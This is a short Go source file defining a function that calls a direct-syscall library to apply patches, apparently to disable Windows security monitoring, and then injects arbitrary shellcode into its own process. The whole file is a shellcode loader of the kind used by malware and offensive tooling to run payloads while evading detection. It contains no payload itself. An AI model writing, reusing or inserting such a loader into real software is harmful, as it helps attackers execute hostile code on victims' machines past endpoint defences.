package execute

import (
	"fmt"
	"github.com/carved4/go-direct-syscall"
)

func ExecuteShellcode(shellcode []byte) {
	winapi.ApplyAllPatches()
	err := winapi.NtInjectSelfShellcode(shellcode)
	if err != nil {
		fmt.Println("Error injecting shellcode:", err)
	}
}
